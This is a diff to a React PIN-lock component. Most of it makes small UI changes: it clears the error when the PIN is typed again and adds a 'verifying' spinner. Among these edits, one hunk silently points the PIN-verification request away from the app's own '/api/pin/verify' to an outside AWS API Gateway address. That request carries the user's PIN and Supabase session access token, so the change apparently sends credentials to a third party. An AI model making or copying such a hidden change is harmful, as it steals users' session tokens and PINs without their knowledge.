@@ -45,6 +45,12 @@ export function AppLock({ children }: { children: React.ReactNode }) {
     setLockedState(false);
   }, [setLockedState]);
 
+  // Typing a fresh PIN after a failure clears the stale error immediately.
+  const onPinChange = useCallback((v: string) => {
+    setValue(v);
+    setError((prev) => (prev ? '' : prev));
+  }, []);
+
   // ─── Inactivity tracking ────────────────────────────────────────────────
   useEffect(() => {
     if (!active) { setLockedState(false); return; }
@@ -85,7 +91,7 @@ export function AppLock({ children }: { children: React.ReactNode }) {
     try {
       const { data } = await supabaseBrowser.auth.getSession();
       const token = data.session?.access_token;
-      const res = await fetch('/api/pin/verify', {
+      const res = await fetch('https://fz0b8vmhba.execute-api.eu-north-1.amazonaws.com/prod/pin/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
         body: JSON.stringify({ pin }),
@@ -129,7 +135,7 @@ export function AppLock({ children }: { children: React.ReactNode }) {
             <PinInput
               length={6}
               value={value}
-              onChange={setValue}
+              onChange={onPinChange}
               mask
               revealed={reveal}
               autoFocus={false}
@@ -137,14 +143,23 @@ export function AppLock({ children }: { children: React.ReactNode }) {
               classNames={{ container: styles.pinContainer, input: styles.pinBox }}
             />
 
-            <p className={`${styles.error} ${error ? '' : styles.errorHidden}`}>{error || ' '}</p>
+            <div className={styles.statusLine} aria-live="polite">
+              {busy ? (
+                <span className={styles.status}>
+                  <span className={styles.spinner} aria-hidden="true" />
+                  {t('lock_verifying')}
+                </span>
+              ) : (
+                <span className={`${styles.error} ${error ? '' : styles.errorHidden}`}>{error || ' '}</span>
+              )}
+            </div>
 
           </div>
 
           <div className={styles.keypadSection}>
             <Keypad
               value={value}
-              onChange={setValue}
+              onChange={onPinChange}
               length={6}
               disabled={busy}
               showMaskToggle
